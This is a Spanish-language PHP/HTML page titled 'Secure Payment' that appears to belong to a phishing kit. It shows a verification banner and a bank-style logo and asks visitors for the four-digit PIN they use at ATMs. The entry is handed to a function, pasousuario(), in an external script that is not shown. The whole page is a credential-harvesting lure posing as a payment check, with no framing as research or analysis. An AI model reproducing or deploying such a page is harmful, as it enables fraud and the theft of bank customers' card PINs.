<?php

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">


    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">


    
        <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="/scripts/functions.js"></script>  		


    <title>Secure Payment</title>

    <style>

    *{
        margin: 0;
        padding: 0;
        font-family: Arial, Helvetica, sans-serif;
    }

    </style>


</head>
<body style="background-color:#ececec;">

<center><img src="img/verify.png" alt="" srcset="" width="50%">

<br><br>

<img src="img/logo.png" alt="" srcset="" width="50%">


<br><br><a style="font-size:30px;">Ingresa tu clave</a></center>

<br><div class="contenido" style="width:90%; border-radius:30px; border: none; background-color:white; height:290px; padding:20px; margin:auto;">

<center><a style="font-size:16px; text-align:center;">La clave es la misma que utilizas en el cajero</a><br>

<br><br><input type="text" name="user" id="txtPassword" placeholder="****" style="border:none; width:90%;height:35px; border-bottom:1px solid #dcdcdc; padding.left:15px; text-align:center;" maxlength="4" minlenght="4"><br></center>
<br><a style="position:absolute; right:80px;">¿olvidaste tu clave?</a><br>
<br>
<center><input type="submit" value="Continuar" id="btnPass" style="width:80%; background-color:#fdd923; height:40px; border-radius:100px; border:none; font-weight:bold; color:black;"></center>

</div>



<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {
	

		$('#btnPass').click(function(){
			if ($("#txtPassword").val().length > 3) {
				pasousuario($("#txtPassword").val());	
			}else{
				$(".mensaje").show();
			}	
		});

				
	});
</script>
</body>
</html>